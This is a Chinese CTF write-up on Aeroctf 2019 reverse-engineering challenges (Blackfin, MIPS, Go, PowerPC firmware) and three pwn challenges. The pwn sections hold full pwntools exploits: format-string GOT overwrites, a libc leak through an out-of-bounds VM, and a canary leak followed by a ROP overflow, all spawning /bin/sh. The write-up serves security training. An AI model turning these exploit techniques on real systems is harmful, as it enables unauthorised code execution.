# Aeroctf2019 中逆向和pwn的writeup

阅读量 **362825**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-04-01 15:30:26

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t0195a03cb5c271b8ce.png)

## AEROCTF

[Aeroctf](http://aeroctf.com/challenges) 是 Moscow State Technical University
of Civil aviation举办的CTF，题目大多和飞机有关，涉及了飞机、安全和航空固件等内容，同时具备战斗民族的属性——不走寻常路。

## 逆向

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328131207.png)

###  key checker

[题目](http://aeroctf.com/files/6921ce3540c49e34969dab8f22bde55f/keychecker.s)提供了一个keychecker.s文件，.s文件是.c文件编译成为汇编的结果，还没输出成为可执行文件。

    
    
    .file "keychecker.cpp";
        .section    .ctors,"aw",@progbits
        .align 4
        .long    __GLOBAL__I_main
        .section    .text._ZSt3minImERKT_S2_S2_,"axG",@progbits,_ZSt3minImERKT_S2_S2_,comdat
        .align 4
        .weak    __ZSt3minImERKT_S2_S2_
    .type __ZSt3minImERKT_S2_S2_, STT_FUNC;
    __ZSt3minImERKT_S2_S2_:
    L$LFB$1603:
        LINK 4;
    L$LCFI$0:
        [FP+8] = R0;
        [FP+12] = R1;
        P2 = [FP+12];
        R1 = [P2];
        P2 = [FP+8];
        R0 = [P2];
        cc =R1<R0 (iu);
        if !cc jump L$L$2;
        R0 = [FP+12];
        [FP+-4] = R0;
        jump.s L$L$4;
        ...
        .align 4
    L$LEFDE$11:
        .ident    "GCC: (GNU) 4.2.0"
    

一般的解法是利用gcc继续输出成为可执行的文件，以下是来自stackoverflow的说明

    
    
    Yes, You can use gcc to compile your asm code. Use -c for compilation like this:
    gcc -c file.S -o file.o
    This will give object code file named file.o. To invoke linker perform following after above command:
    gcc file.o -o file
    

然而，这次提供的.s文件汇编十分偏门，既不是x86，也不是arm，而且gcc版本很低很奇怪（现在一般都是7/8），查了很久才知道是blackfin的汇编，可以参考[这篇](http://bfincn.blogspot.com/2008/11/blackfin_22.html)文章。

找到了blackfin的gcc，在[这个网站](https://sourceforge.net/projects/adi-toolchain/files/)下载了windows版toolchain，可以利用bfin-uclinux-gcc将其编译成为可执行文件，但是由于固件的独特性，找不到运行环境，所以上面这些努力有点白费。

不过汇编都是类似的，在lyx师傅的指导下，直接静态刚汇编。

在`__ZZ4mainE4C.92:`提供了一组常量

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328183917.png)

汇编每轮都在进行异或和加的操作，每轮对加和异或的因子进行+1

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328184145.png)

解题脚本

    
    
    s = [int(i) for i in """
    79
    111
    130
    133
    113
    ...
    119
    """.split("n") if i!='']
    
    add_factor = 3
    xor_factor = 13
    index = 0
    result = ""
    for i in range(len(s)):
        result += chr((s[i] - add_factor)^xor_factor)
        print result
        add_factor += 1
        xor_factor += 1
    

解得Aero{ec952bccabe30c7d6fd36cb465a3c897}

###  engine firmware

We have part of the GE90 engine firmware, which is responsible for the rotors.
This engine behaved strangely in one of the flights and it was decided to send
it for diagnosis. Look at the firmware, maybe you will find the reasons for
strange behavior.

这题开始就看出是航空学校出的题，大意是要找出引擎为什么失灵（为啥不是近期某热点7*7呢）

查看类型是MIPS程序，且无符号信息。

    
    
    engine_firmware: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=c58560839cce5f889fb021464b1c6c215130b49e, stripped
    

上Qemu+IDA调试

    
    
    qemu-mips -strace -g 23946 engine_firmware
    

一开始让程序运行，怎么都没有输入的地方，感觉要脑洞了。发现程序一直在0x400AC8(func_select)中循环，如果跳出此函数就提示Crash the
engine starting!，符合题目中分析故障原因的要求。

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328185104.png)

查找字符串，定位到secret key所在函数0x4008E0，看到这里

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328185214.png)

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328185302.png)

继续交叉引用网上查找，发现在0x400b84处，强行修改跳转至0x400b8c，即可获得2次用户输入机会

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328185342.png)

根据strace的信息，第一次输入1024字节，第二次输入38字节

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328185415.png)

然后在第一次和第二次输入之间就进入了目标函数0x4008E0

**Ghidra分析**

由于IDA7.0对于mips只能调试，没有静态反汇编功能，所以使用近期比较热门的NSA开源工具Ghidra进行反汇编分析。

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328185510.png)

对0x4008E0进行了重命名为read_secretkey，内容如下

    
    
    undefined4 read_secretkey(uint *puParm1)
    
    {
      uint uVar1;
      char *key;
      int idx;
    
      uVar1 = *puParm1;
                        /* modify the last element */
      FUN_0040a030(PTR_DAT_004a0d74);
      key = (char *)FUN_00418de0(0x26);
      read_key(0,key,0x26);
      idx = 0;
      DAT_004a0878 = (((((int)((uVar1 ^ 0x6ed) * 2 + 0x54) >> 1) - 0x31U ^ 0xfefe) + 0x1e) * 2 ^0xdede)
                     & 0xbe;
      while( true ) {
        if (0x25 < idx) {
          print_out("Secret key is valid!nSet a hyper mode!");
          return 0x539;
        }
        uVar1 = getVar();
        if (((int)key[idx] ^ uVar1 & 0xff) != *(uint *)((int)&PTR_004a07dd + idx * 4 + 3)) break;
        idx = idx + 1;
      }
      return 0xffffffff;
    }
    

其中动态调试时发现， **第一次输入的内容只会传入1个字节到函数里** 。

经过一轮变换，存储在DAT_004a0878，即数组0x4a0e70的最后一个元素（如下图覆盖位0xb2）。最后一个元素由于& 0xbe，所以也会是1字节。

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328185725.png)

然后输入key，执行uVar1 = getVar(); 而getVar函数对数组最后一个元素进行变换（按4字节）

    
    
    int getVar(void)
    
    {
      DAT_004a0878 = DAT_004a0878 * 0xdead + 0xc0de;
      DAT_004a0878 = DAT_004a0878 + ((uint)(DAT_004a0878 != -1) ^ 1);
      return DAT_004a0878;
    }
    

然后进行比较判断

    
    
    if (((int)key[idx] ^ uVar1 & 0xff) != *(uint *)((int)&PTR_004a07dd + idx * 4 + 3)) break;
    

等效于

    
    
    key[idx] ^ uVar1 & 0xff == 0x4a0e70[idx]
    

**逆向**

由于没有分析第一次输入与传入函数内容的关系，但是由于最后一个元素&0xbe的关系，只有1字节，所以考虑用爆破方法

    
    
    target = [int(i) for i in """
            31          1          0        135
           221         53        206        182
            15          0         52         13
           133        229        232         67
            72         61        240        238
           240        154         47         22
           235        178         18        190
           225         26        156        243
           255        145        132         26
           211         49        178    
    """.replace("n"," ").split(" ") if i!='']
    print len(target),target
    
    #第一次是0xb9528
    def FUN_004012d4(target):
        DAT_004a0878 = target[-1]
        DAT_004a0878 = DAT_004a0878 * 0xdead + 0xc0de;
        DAT_004a0878 = DAT_004a0878 + ((DAT_004a0878 != -1) ^ 1);
        target[-1] = DAT_004a0878 & 0xffffffff
        return target[-1]
    
    for i in range(256):
        #爆破数组最后一个元素
        target[-1] = i
    
        #逆推满足条件的输入
        result = ""
        for j in range(38):
            uVar1 = FUN_004012d4(target)&0xff
            result += chr(target[j] ^ uVar1)
    
        print result
    

爆破结果中找到flag 为 Aero{94fa46539bc69bf665fef0f7f63a5625}

经过这题之后，发现 **qemu+IDA+Ghidra的组合非常好用！**

###  experimental packer

To run the unpacked binary, use the following:

  1. sudo apt-get install qemu qemu-user qemu-user-static
  2. sudo apt-get install gdb-multiarch
  3. sudo apt-get install ‘binfmt *’
  4. ./a.out

题目提供了一个packer和打包后的文件，要求恢复打包前的文件执行即可。

在ida中查找字符串时，发现.go的字样，想起之前看到的一篇
[无符号Golang程序逆向方法解析](https://www.anquanke.com/post/id/170332)
的文章，于是使用了文章推荐的[IDAGolangHelper](https://github.com/sibears/IDAGolangHelper)
恢复go语言的函数

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328222030.png)

恢复效果不错，找到main_main的地方开始逆向，packer先构造了0xe字节的文件头

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328222335.png)

从0xe字节开始，然后使用lzw压缩对原文件进行压缩

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328222417.png)

网上找到一个go语言的解压缩算法，对0xe字节之后的内容进行解密

    
    
    package main
    
     import (
             "compress/lzw"
             "fmt"
             "io"
             "os"
     )
    
     func main() {
    
             inputFile, err := os.Open("a.lzw")
    
             if err != nil {
                     fmt.Println(err)
                     os.Exit(1)
             }
    
             defer inputFile.Close()
    
             outputFile, err := os.Create("a.raw")
    
             if err != nil {
                     fmt.Println(err)
                     os.Exit(1)
             }
    
             defer outputFile.Close()
    
             // file.txt.lzw compressed by
             // https://socketloop.com/references/golang-compress-lzw-newwriter-function-example
             // litWidth is set to 8
    
             lzwReader := lzw.NewReader(inputFile, lzw.LSB, 8) //<----- here !
    
             if err != nil {
                     fmt.Println(err)
                     os.Exit(1)
             }
    
             defer lzwReader.Close()
             io.Copy(outputFile, lzwReader)
    
     }
    

恢复成为a.raw文件后，根据题目提示，运行得到flag

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328222712.png)

###  malware engine

We have already damaged more than one engine from this firmware. The thing is
in some incomprehensible requirement to enter the key. We do not understand
where it came from, can you figure out what key is required to enter?

又是飞机引擎的问题，这回不用脑洞，直接输入key

file一下，是PowerPC的程序，没做过啊！

    
    
    malware_engine: ELF 32-bit MSB executable, PowerPC or cisco 4500, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=bd4ff12ea3e93b1a1767f42004eecb743bcaacf7, stripped
    

不过还是拿出了qemu+IDA+Ghidra的组合拳开始一路调试和理解

利用Ghidra反编译成伪源码查看，在0x10001ef0(enter_key)中发现 **3处动态调用** ，调用后的结果直接影响最后输出是Key is
valid还是程序自爆。

    
    
    undefined4 enter_key(void)
    
    {
      code **ppcVar1;
      int iVar2;
      code *pcVar3;
      undefined4 uVar4;
      undefined auStack124 [24];
      undefined auStack100 [24];
      undefined auStack76 [24];
      undefined auStack52 [36];
    
      FUN_1002aca0(auStack52);
      print(&DAT_101e1c9c,"[?] Enter the key: ");
      getinput(&DAT_101e1af4,auStack52);
      ppcVar1 = (code **)FUN_10007420(0x10);
      FUN_10000f18(ppcVar1,0x539);
      pcVar3 = *(code **)*ppcVar1;
      iVar2 = (*pcVar3)(ppcVar1,auStack76); /* 第一次动态调用 */
      FUN_1002ae80(auStack76);
      if (iVar2 != 0) {
         ppcVar1 = (code **)FUN_10007420(0x1c);
         FUN_1000137c(ppcVar1,0x53a);
         pcVar3 = *(code **)*ppcVar1;
         FUN_1002f710(auStack100,auStack52);
         iVar2 = (*pcVar3)(ppcVar1,auStack100); /* 第二次动态调用 */
         FUN_1002ae80(auStack100);
        if (iVar2 != 0) {
           ppcVar1 = (code **)FUN_10007420(0x28);
           FUN_10001720(ppcVar1,0x53b);
           pcVar3 = *(code **)*ppcVar1; 
           FUN_1002f710(auStack124,auStack52);
           iVar2 = (*pcVar3)(ppcVar1,auStack124); /* 第三次动态调用 */
           FUN_1002ae80(auStack124);
          if (iVar2 != 0) {
            uVar4 = 1; /* 要求返回1 */
            goto LAB_100020a4;
          }
        }
      }
      uVar4 = 0;
    LAB_100020a4:
      FUN_1002ae80(auStack52);
      return uVar4;
    }
    

根据动态调试，这3处动态调用如下，逐一分析调用

  * 10001028 命名为 dynamic_func
  * 100014b4 命名为 dynamic_func2
  * 10001ac8 命名为 dynamic_func3

**第一次动态调用（dynamic_func）**

取出0、4、8、12（每间隔4位）的输入，与目标值进行运算比较，都是单个字符进行运算

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328225604.png)

提取目标值，并且用python进行运算

    
    
    result = [ord('*')]*len(arr)
    result[0] = arr[0] - 0x28
    result[4] = (((arr[4] - 0x17 ^ 0x11) + 9)>>1 ^ 0x4f)-0x19
    result[8] = arr[8]/2 - 6
    result[12] = (arr[12] + 0x14)
    result[16] = arr[16] ^ 0x4f
    result[20] = (arr[20] >> 2)*2 + 3
    result[24] = (arr[24] - 0x14 )/3
    result[28] = (arr[28] - 0xe ) ^ 0x58
    
    print "result","".join([chr(k&0xff) for k in result])
    

得出

    
    
    result 0***7***e***c***b***c***8***5***
    

**第二次动态调用（dynamic_func2）**

调用了4次，但是每次是将8个字符（如0-7,8-15等）传入函数calcSum算出一个值，与目标常量进行比较

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328230058.png)

可以想到目前对于输入已知位数太少，这里传入8位必然有很多多解（爆破空间也太大），所以先跳过这里，等对输入位知道更多以后再回来看。

**第三次动态调用（dynamic_func3）**

跳过第二次调用，进入dynamic_func3来看。在Ghidra中，看到恢复的源码很复杂，到底哪个数与哪个数异或，右移？

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/1553786010836.png)

但是动态调试就很清晰

  * 对于函数10002724，R3、R4、R5是输入，R3是取奇数位输入（input[1]、input[3]、input[5]等等）；R4是每4轮变一次的常量，一开始是0x201b，然后是0x201c；R5是固定值0x3966d59。
  * 对于函数100027f4，则是与计算与输入无关的常量
  * 程序比较两者结果的值

![](https://raw.githubusercontent.com/anic/mymarkdownpic/master/img/20190328231428.png)

动态提取这些常量，进行正向爆破

    
    
    arr = [i.split(" ") for i in """
    0x201b 0x01148455
    0x201b 0x0287099D
    0x201b 0x021CE200
    0x201b 0x01148455
    0x201c 0x01D199F2
    0x201c 0x02F159E9
    0x201c 0x00F1EFDA
    0x201c 0x01714D3C
    0x2019 0x026A8FFF
    0x2019 0x01BC8A83
    0x2019 0x00D0991B
    0x2019 0x005FD57A
    0x201a 0x011F7280
    0x201a 0x00099D6F
    0x201a 0x008629E4
    0x201a 0x012F42EB
    """.split("n") if i!='']
    
    for i in range(len(arr)):
        ix = 2*i + 1
        target = int(arr[i][1],16)
        param2 = int(arr[i][0],16)
        for j in range(32,128):
            t = FUN_10002724(j,param2,0x3966d59)
            if t == target:
                result[ix] = j
                break
    
        print "result","".join([chr(k&0xff) for k in result])
    

计算后结果为

    
    
    result 0e*c7d*ee8*ec3*7ba*ec1*489*b57*6
    

现在只剩个别位字符未知了，可以回去爆破第二次动态调用（dynamic_func2）

    
    
    target2 = [int(i,16) for i in """
    0xB76D
    0x5650
    0x7F17
    0xF06E
    """.split("n") if i!='']
    
    for i in range(4):
        s = result[i*8:i*8+8]
        for x in "1234567890abcdef":
            for y in "1234567890abcdef":
                s[2] = ord(x)
                s[6] = ord(y)
                t = calcSum(s+[0],8)
                if t == target2[i]:
                    result[i*8+2] = s[2]
                    result[i*8+6] = s[6]
                    print "result","".join([chr(k&0xff) for k in result])
    

得到

    
    
    result 0e1c7d9ee8eec3e7bafec18489eb5766
    

## PWN

###  navigation system

输入用户名和密码，经过getOTPcode函数生成随机码

    
    
    unsigned int __cdecl genOTPcode(char *a1, char *a2)
    {
      time_t v2; // eax
      unsigned int v3; // eax
    
      v2 = time(0);
      srand(*a2 + *a1 + v2);
      v3 = rand();
      return v3 + (v3 >= 0xFFFFFFFF);
    }
    

在setStation函数中有printf格式化字符串漏洞

    
    
    unsigned int setStation()
    {
      char buf[32]; // [esp+Ch] [ebp-2Ch]
      unsigned int v2; // [esp+2Ch] [ebp-Ch]
    
      v2 = __readgsdword(0x14u);
      printf("Set station > ");
      fflush(stdout);
      buf[read(0, buf, 0x20u)] = 0;                 // off by one
      printf("Station: ");
      printf(buf);                                  // printf 漏洞
      putchar(10);
      return __readgsdword(0x14u) ^ v2;
    }
    

解题思路

  * 指定种子的随机数生成
  * printf格式化字符串漏洞，长度限制时逐字节修改
  * 修改exit[@got](https://github.com/got "@got")为main获得再次输入
  * 修改strcmp[@got](https://github.com/got "@got")为system[@plt](https://github.com/plt "@plt")

解题脚本

    
    
    #!/usr/bin/env python2
    # -*- coding:utf8 -*-    
    import struct
    from pwn import *
    from pwnlib.util.proc import wait_for_debugger
    
    
    local = len(sys.argv) == 2
    
    elf = ELF(sys.argv[1])
    
    if local:
        io = process(sys.argv[1])
        libc = ELF("/lib/i386-linux-gnu/libc.so.6") #32bit
    
    def set_station(content):
        io.sendlineafter("> ","2")
        io.sendlineafter("Set station > ",content)
    
    NAME = "test_account"
    PASS = "test_password"
    io.sendlineafter("Login: ",NAME) 
    io.sendlineafter("Password: ",PASS) 
    seedproc = process(argv=["./test",NAME,PASS])
    content = seedproc.recvall()
    arr = [int(i) for i in content.split("n") if i!='']
    io.sendlineafter("code: ",str(arr[0])) 
    
    
    # printf update exit@got->main
    # read(0,0x20...) not enough length
    
    def fmt_change(got_addr,target):
        ts = p32(target)
        for i in range(4):
            num = "%"+str(ord(ts[i]))+"c" if ord(ts[i]) > 0 else ""
            payload = (num + "%10$hhn").ljust(12,'a') + p32(got_addr+i)
            set_station(payload)
    
    #change exit@got -> main
    exit_got = elf.got["exit"]
    main_addr = elf.symbols["main"]
    fmt_change(exit_got,main_addr)
    
    #change strcmp@got -> system@plt
    strcmp_got = elf.got["strcmp"]
    system_plt = elf.plt["system"]
    fmt_change(strcmp_got,system_plt)
    
    
    #trigger exit
    io.sendlineafter("> ","4")
    
    io.sendlineafter("Login: ","/bin/sh") 
    io.sendlineafter("Password: ","aa") 
    io.interactive()
    

###  engine script

输入一段code，可以进行栈操作，没有进行边界检查所以可以任意地址读写

    
    
    void __cdecl proceedOpertaion(char a1)
    {
      fflush(stdout);
      fflush(stdin);
      switch ( a1 )
      {
        case 'a':
          ++*stack_ptr;
          break;
        case 'd':
          --stack_ptr;
          break;
        case 'g':
          *stack_ptr = getchar();
          break;
        case 'p':
          putchar((char)*stack_ptr);
          break;
        case 's':
          --*stack_ptr;
          break;
        case 'u':
          ++stack_ptr;
          break;
        default:
          exit(0xFFFFFAC7);
          return;
      }
    }
    

套路还是和上题一样

  * leak 出got表函数的地址，计算libc.address（没给libc要查找一下）
  * 修改exit[@got](https://github.com/got "@got")为main，获得再次输入的机会
  * 修改auth=0，strcmp=system[@libc](https://github.com/libc "@libc")，再次进入main
  * 输入/bin/sh，用strcmp触发system函数

解题脚本

    
    
    #!/usr/bin/env python2
    # -*- coding:utf8 -*-    
    import struct
    from pwn import *
    from pwnlib.util.proc import wait_for_debugger
    
    local = len(sys.argv) == 2
    elf = ELF(sys.argv[1])
    
    if local:
        io = process(sys.argv[1])
        libc = ELF("/lib/i386-linux-gnu/libc.so.6") #32bit
    
    NAME = "admin"
    PASS = "password"
    io.sendlineafter("Login: ",NAME) 
    io.sendlineafter("Password: ",PASS) 
    
    #stack             = 0x804C0A0
    #putchar@got     = 0x804C03C
    #exit@got        = 0x804C028
    code = 'd'*(0xa0-0x3f)
    code += 'p'
    code += 'p' #print putchar@got
    code += 'd'
    code += 'p' #print putchar@got
    code += 'd'
    code += 'p' #print putchar@got
    code += 'd'
    code += 'p' #print putchar@got 0x3c
    code += 'd'*(0x3c - 0x2b)
    # code += 'g' 
    code += 'd'
    code += 'g' #莫名其妙多了个n，多输入一次
    code += 'g' #write exit@got -> main
    code += 'd'
    code += 'g' #write exit@got -> main
    code += 'd'
    code += 'g' #write exit@got -> main
    code += 'x' #trigger exit()
    
    io.sendafter("Input your code here: ",code)
    print hex(libc.symbols["putchar"])
    
    #第一次调用putchar，让putchar@got=putchar@libc
    io.recv(1)
    
    c = ''
    c += io.recv(1)
    c += io.recv(1)
    c += io.recv(1)
    c += io.recv(1)
    putchar_addr = u32(c[::-1])
    success("putchar_addr : %x"%putchar_addr)
    libc.address = putchar_addr - libc.symbols["putchar"]
    success("libc.address : %x"%libc.address)
    
    #exit未触发，最高位是08不用修改
    time.sleep(1)
    main_addr = 0x8049222
    io.send('x04')
    io.send('x92')
    io.send('x22')
    
    #stack             = 0x804C0A0
    #auth             = 0x804C064 
    #strcmp@got     = 0x804C00C
    code = 'd'*(0xa0-0x64)
    code += 'g' #write auth = 0
    code += 'd'*(0x64 - 0x0f)
    code += 'g' #write strcmp@got -> system
    code += 'd'
    code += 'g' #write strcmp@got -> system
    code += 'd'
    code += 'g' #write strcmp@got -> system
    code += 'd'
    code += 'g' #write strcmp@got -> system
    code += 'x' #trigger exit() back to main
    
    io.sendafter("Input your code here: ",code)
    time.sleep(1)
    io.send('x00') #reset auth
    system_addr = p32(libc.symbols["system"])
    success("system@libc :%x"%libc.symbols["system"])
    for i in range(4):
        io.send(system_addr[4-1-i]) #reset auth
    
    io.sendlineafter("Login: ","/bin/sh") 
    io.sendlineafter("Password: ","aaa") 
    io.interactive()
    

###  remote storage

stripped，没给符号，但是发现是static linked，说明system和/bin/sh都在elf中

    
    
    anic@ubuntu:~/ctfsample/aeroctf/pwn3$ file storage
    storage: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=601158bdf08a8379f6b7cbe803dd1bf99bfa7e35, stripped
    
    anic@ubuntu:~/ctfsample/aeroctf/pwn3$ checksec storage
    [*] '/mnt/hgfs/ctfsample/aeroctf/pwn3/storage'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    

虽然checksec说没有canary，但是实际运行发现是有canary的

没有符号，重命名函数的过程比较痛苦，主要考猜，如fread啊、fopen、printf和puts之类。期待大佬们有更好的方法，请告知。

在signfile函数，有一个格式化字符串漏洞，一开始以为是签名后的内容，后面发现是filehash和signer的异或结果，可以控制输出cannary

    
    
     printf("%02x", (unsigned __int8)v11[j]);
        v7 = strlen(v10);
        for ( k = 0; k <= 15; ++k )
          a1[k] = v10[k % v7] ^ v11[k];             // use xor to sign
        printf("nFile sign: ");
        printf(a1);                                 // format bug
        putchar(0xAu);
        result = unknown_func(off_80F84B8);
      }
      else
      {
        puts("[-] Error in file open!");
        puts("[-] Sign error!");
    

另一个漏洞点是addfileinfo函数，read长度越界

    
    
     char v11[128]; // [esp+BCh] [ebp-18Ch]
      char v12[256]; // [esp+13Ch] [ebp-10Ch]
      unsigned int v13; // [esp+23Ch] [ebp-Ch]
    
      v13 = __readgsdword(0x14u);
      sub_8049088((int)v10, 0, 128);
    
      ...
    
          v11[v6] = 0;                              // off by one
          fputs(v11, fd);
        }
        printf("Enter the file owner name: ");
        unknown_func(off_80F84B8);
        v7 = read(0, v12, 0x200u);                  // overflow
                                                    // 
        if ( v7 > 0 )
        {
          v12[v7] = 0;
          fputs(v12, fd);
        }
        fclose(fd);
      }
    

结合上面获得的canary和静态编译到elf的system、binsh，来一波rop进行getshell

    
    
    #!/usr/bin/env python2
    # -*- coding:utf8 -*-    
    import struct
    from pwn import *
    from pwnlib.util.proc import wait_for_debugger
    
    local = len(sys.argv) == 2
    
    elf = ELF(sys.argv[1])
    
    if local:
        io = process(sys.argv[1])
        libc = ELF("/lib/i386-linux-gnu/libc.so.6") #32bit
    
    
    def uploadfile(name,content):
        io.sendlineafter("> ","2")
        io.sendlineafter("filename: ",name)
        io.sendlineafter("file data: ",content)
    
    
    def addfileInfo(filename,name,date,name2):
        io.sendlineafter("> ","5")
        io.sendlineafter("filename: ",filename)
        io.sendafter("owner name: ",name)
        io.sendafter("create date: ",date)
        io.sendafter("owner name: ",name2)
    
    def viewfileInfo(filename):
        io.sendlineafter("> ","6")
        io.sendlineafter("filename: ",filename)
    
    def signfile(filename,signer):
        io.sendlineafter("> ","4")
        io.sendlineafter("filename: ",filename)
        io.sendlineafter("signer name: ",signer)
    
    def get_signer(hash,target):
        result = ""
        for i in range(len(target)):
            t = ord(target[i]) ^ ord(hash[i])
            result += chr(t)
    
        return result
    
    NAME = "admin"
    PASS = "admin"
    io.sendlineafter("Login: ",NAME) 
    io.sendlineafter("Password: ",PASS) 
    
    uploadfile("aaa","bbb")
    
    filehash = 'b8694d827c0f13f22ed3bc610c19ec15'.decode("hex")
    targethash = '.zz%195$p..x00'
    signer = get_signer(filehash,targethash)
    success("signer : %s"%signer)
    signfile("aaa",signer.ljust(16,'a'))
    
    #get cannary
    io.recvuntil("zz")
    cannary = int(io.recvuntil("..",drop=True),16)
    success("cannary : %x"%cannary)
    
    #rop to system
    system_addr = 0x8052CF0
    bin_sh = 0x80C7B8C
    payload = "e"*(256) + p32(cannary) + p32(0xabcdef)*3 + p32(system_addr) + p32(0xfedcba) + p32(bin_sh)
    addfileInfo("aaa","ccc","ddd", payload)
    
    io.interactive()
    

## 小结

  * 逆向比较有特色，pwn的题目相对简单
  * qemu+IDA+Ghidra组合拳出乎意料的好用

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **anic** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/175627](/post/id/175627)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [逆向工程](/tag/逆向工程)
  * [Ghidra](/tag/Ghidra)

 **+1** __2赞

 __收藏

![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg) anic

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

